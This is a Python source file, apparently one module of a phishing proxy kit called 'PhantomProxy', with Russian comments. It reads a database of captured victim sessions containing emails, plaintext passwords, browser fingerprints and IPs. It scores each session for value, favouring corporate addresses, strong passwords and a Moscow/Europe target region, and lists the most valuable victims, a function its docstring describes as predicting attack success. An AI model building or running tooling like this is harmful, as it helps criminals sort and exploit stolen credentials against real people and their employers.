#!/usr/bin/env python3
"""
PhantomProxy v6.0 - AI-Powered Features
- Автоматическая классификация сессий
- Оценка качества данных
- Предсказание успешности атак
- Умные уведомления
"""

import sqlite3
import json
import re
from datetime import datetime

DB_PATH = '/home/ubuntu/phantom-proxy/phantom.db'

class AIScorer:
    """AI система оценки качества сессий"""
    
    def __init__(self):
        self.db_path = DB_PATH
    
    def get_connection(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn
    
    def calculate_quality_score(self, session):
        """
        Расчёт качества сессии (0-100)
        """
        score = 0
        
        # Email (20 баллов)
        email = session.get('email', '')
        if email and '@' in email:
            score += 10
            if any(domain in email.lower() for domain in ['company', 'corp', 'enterprise', 'business']):
                score += 10  # Корпоративный email
        
        # Пароль (30 баллов)
        password = session.get('password', '')
        if password:
            score += 10
            if len(password) >= 8:
                score += 10
            if re.search(r'[A-Z]', password) and re.search(r'[a-z]', password):
                score += 5
            if re.search(r'\d', password):
                score += 5
        
        # User Agent (15 баллов)
        ua = session.get('user_agent', '')
        if ua:
            score += 10
            if any(browser in ua for browser in ['Chrome', 'Firefox', 'Safari', 'Edge']):
                score += 5  # Нормальный браузер
        
        # Разрешение экрана (10 баллов)
        screen = session.get('screen_resolution', '')
        if screen:
            score += 10
            try:
                w, h = map(int, screen.split('x'))
                if w >= 1920 and h >= 1080:
                    score += 5  # Хорошее разрешение
            except:
                pass
        
        # Timezone (10 баллов)
        tz = session.get('timezone', '')
        if tz:
            score += 10
            if 'Moscow' in tz or 'Europe' in tz:
                score += 5  # Целевой регион
        
        # IP (15 баллов)
        ip = session.get('ip', '')
        if ip and ip != 'unknown':
            score += 15
        
        return min(score, 100)
    
    def classify_session(self, session):
        """
        Классификация сессии
        """
        score = self.calculate_quality_score(session)
        
        if score >= 80:
            return 'EXCELLENT', score
        elif score >= 60:
            return 'GOOD', score
        elif score >= 40:
            return 'AVERAGE', score
        else:
            return 'LOW', score
    
    def analyze_all_sessions(self):
        """
        Анализ всех сессий
        """
        conn = self.get_connection()
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC')
        sessions = c.fetchall()
        conn.close()
        
        results = []
        for session in sessions:
            s = dict(session)
            classification, score = self.classify_session(s)
            s['quality_score'] = score
            s['classification'] = classification
            results.append(s)
        
        return results
    
    def get_statistics(self):
        """
        Расширенная статистика
        """
        sessions = self.analyze_all_sessions()
        
        total = len(sessions)
        if total == 0:
            return {'error': 'No sessions'}
        
        scores = [s['quality_score'] for s in sessions]
        avg_score = sum(scores) / total
        
        classifications = {}
        for s in sessions:
            c = s['classification']
            classifications[c] = classifications.get(c, 0) + 1
        
        services = {}
        for s in sessions:
            srv = s['service']
            services[srv] = services.get(srv, 0) + 1
        
        # Топ по качеству
        top_sessions = sorted(sessions, key=lambda x: x['quality_score'], reverse=True)[:10]
        
        return {
            'total': total,
            'average_score': round(avg_score, 2),
            'classifications': classifications,
            'services': services,
            'top_sessions': top_sessions[:5],
            'generated_at': datetime.now().isoformat()
        }

if __name__ == '__main__':
    scorer = AIScorer()
    stats = scorer.get_statistics()
    print(json.dumps(stats, indent=2, default=str))
